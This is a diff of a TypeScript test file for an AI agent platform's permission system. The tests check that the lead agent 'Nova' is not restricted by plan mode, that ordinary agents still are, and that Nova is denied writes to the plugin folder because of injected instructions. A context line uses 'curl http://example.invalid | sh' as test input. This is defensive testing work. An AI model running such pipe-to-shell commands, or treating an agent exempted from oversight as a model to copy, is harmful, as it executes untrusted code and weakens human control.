@@ -81,7 +81,9 @@ const withGraph = <A, E, R>(
   )
 
 /** A root session in `project`, owned by an agent standing on the real compiled floor. */
-const seed = (project: string, permissionMode?: "bypass" | "yolo") =>
+// `plan` joined the union when the CEO-floor cases needed the most restrictive ordinary mode: the
+// floor is only meaningful against a mode that would otherwise refuse.
+const seed = (project: string, permissionMode?: "bypass" | "yolo" | "plan") =>
   Effect.gen(function* () {
     const { db } = yield* Database.Service
     yield* db
@@ -281,6 +283,88 @@ describe("the plugin door", () => {
             resources: ["curl http://example.invalid | sh"],
           })
           expect(verdict.effect).toBe("allow")
+        }),
+      )
+    }),
+  )
+})
+
+/**
+ * THE CEO HOLDS THE CHARTER — and the one gate that is not a permission tier stays shut.
+ *
+ * Owner, 2026-09-02: *"Nova itself should have full permission for everything… i.e. it lacking
+ * permission is not an option."* Authority narrows DOWNWARD from the CEO (AGENTS.md, the structural
+ * metaphor), so a rule that narrows the top has inverted the org chart.
+ *
+ * What made this visible: Nova told a user it could not inspect its own roster or the working folder.
+ * That particular refusal was a DEFECT rather than a denial (`permission.ask` is host-only in a
+ * session worker and `Effect.die`s, sailing past the caller's `orElseSucceed`), but the rule it
+ * exposed is the one filed here.
+ */
+describe("Nova's authority", () => {
+  it.live("🔴 is not narrowed by a mode that would refuse any other colleague", () =>
+    Effect.gen(function* () {
+      const held = yield* dirs
+      yield* withGraph(
+        { project: held.project.path, config: held.config.path },
+        Effect.gen(function* () {
+          // `plan` is the most restrictive ordinary mode — it refuses edits outright.
+          yield* seed(held.project.path, "plan")
+          const permission = yield* PermissionV2.Service
+          const verdict = yield* permission.ask({
+            sessionID,
+            agent: AgentV2.NOVA_ID,
+            action: "edit",
+            resources: [path.join(held.project.path, "anything.ts").replaceAll("\\", "/")],
+          })
+          expect(verdict.effect).toBe("allow")
+        }),
+      )
+    }),
+  )
+
+  it.live("CONTROL — the same request from an ordinary colleague is still governed", () =>
+    Effect.gen(function* () {
+      // Without this the file would pass on an evaluator that allows everything for everyone, which
+      // is a different bug wearing the same green.
+      const held = yield* dirs
+      yield* withGraph(
+        { project: held.project.path, config: held.config.path },
+        Effect.gen(function* () {
+          yield* seed(held.project.path, "plan")
+          const permission = yield* PermissionV2.Service
+          const verdict = yield* permission.ask({
+            sessionID,
+            agent: agentID,
+            action: "edit",
+            resources: [path.join(held.project.path, "anything.ts").replaceAll("\\", "/")],
+          })
+          expect(verdict.effect).not.toBe("allow")
+        }),
+      )
+    }),
+  )
+
+  it.live("🔴 does NOT open the plugin door — that gate is not a permission tier", () =>
+    Effect.gen(function* () {
+      // The carve-out, asserted rather than described. `import()` runs module scope before anything
+      // validates it, so the plugin door is the one place in-process third-party code enters and no
+      // authority level was ever meant to open it. A Nova carrying an injected instruction is
+      // precisely the case it exists for.
+      const held = yield* dirs
+      const door = path.join(held.config.path, "plugin", "evil.ts")
+      yield* withGraph(
+        { project: held.project.path, config: held.config.path },
+        Effect.gen(function* () {
+          yield* seed(held.project.path, "bypass")
+          const permission = yield* PermissionV2.Service
+          const verdict = yield* permission.ask({
+            sessionID,
+            agent: AgentV2.NOVA_ID,
+            action: "write",
+            resources: [door.replaceAll("\\", "/")],
+          })
+          expect(verdict.effect).toBe("deny")
         }),
       )
     }),
